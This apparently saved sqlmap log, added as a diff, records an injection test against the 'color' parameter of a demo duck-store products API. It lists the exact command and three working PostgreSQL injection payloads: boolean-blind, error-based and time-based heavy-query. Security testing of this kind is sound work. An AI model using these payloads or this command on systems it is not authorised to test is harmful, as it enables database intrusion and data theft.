@@ -1,0 +1,84 @@
+# command: sqlmap -u "https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink" --batch --level=2 --risk=1 --threads=4 -p color --output-dir=/work/tool_outputs/sqlmap_products_color 2>&1 | head -150
+# tool: sqlmap
+# exit_code: 0
+# ts: 2026-09-29T16:27:34.655377+00:00
+# ---
+
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.8#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 16:26:55 /2026-09-29/
+
+[16:26:55] [WARNING] using '/work/tool_outputs/sqlmap_products_color' as the output directory
+[1/1] URL:
+GET https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink
+do you want to test this URL? [Y/n/q]
+> Y
+[16:26:55] [INFO] testing URL 'https://duck-store.escape.tech/api/v1/products/filter/by-color?color=Pink'
+[16:26:55] [INFO] using '/work/tool_outputs/sqlmap_products_color/results-09292026_0426pm.csv' as the CSV results file in multiple targets mode
+[16:26:55] [INFO] testing connection to the target URL
+[16:26:56] [INFO] checking if the target is protected by some kind of WAF/IPS
+[16:26:57] [INFO] testing if the target URL content is stable
+[16:26:57] [INFO] target URL content is stable
+[16:26:57] [INFO] heuristic (basic) test shows that GET parameter 'color' might be injectable (possible DBMS: 'PostgreSQL')
+[16:26:57] [INFO] testing for SQL injection on GET parameter 'color'
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (2) and risk (1) values? [Y/n] Y
+[16:26:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[16:26:57] [WARNING] reflective value(s) found and filtering out
+[16:26:59] [INFO] GET parameter 'color' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[16:26:59] [INFO] testing 'Generic inline queries'
+[16:26:59] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[16:26:59] [INFO] GET parameter 'color' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable 
+[16:26:59] [INFO] testing 'PostgreSQL inline queries'
+[16:26:59] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[16:26:59] [WARNING] time-based comparison requires larger statistical model, please wait.............. (done)
+[16:27:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[16:27:02] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'
+[16:27:02] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
+[16:27:02] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'
+[16:27:02] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'
+[16:27:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[16:27:03] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'
+[16:27:03] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'
+[16:27:03] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'
+[16:27:03] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
+[16:27:08] [INFO] GET parameter 'color' appears to be 'PostgreSQL AND time-based blind (heavy query)' injectable 
+[16:27:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[16:27:08] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[16:27:08] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[16:27:09] [INFO] target URL appears to have 10 columns in query
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
+[16:27:22] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[16:27:26] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+GET parameter 'color' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 170 HTTP(s) requests:
+---
+Parameter: color (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: color=Pink%' AND 2633=2633 AND 'KjAJ%'='KjAJ
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: color=Pink%' AND 6156=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (6156=6156) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND 'eyJB%'='eyJB
+
+    Type: time-based blind
+    Title: PostgreSQL AND time-based blind (heavy query)
+    Payload: color=Pink%' AND 3692=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)) AND 'kSjz%'='kSjz
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[16:27:33] [INFO] the back-end DBMS is PostgreSQL
+back-end DBMS: PostgreSQL
+[16:27:34] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 155 times
+[16:27:34] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/work/tool_outputs/sqlmap_products_color/results-09292026_0426pm.csv'
+
+[*] ending @ 16:27:34 /2026-09-29/
+
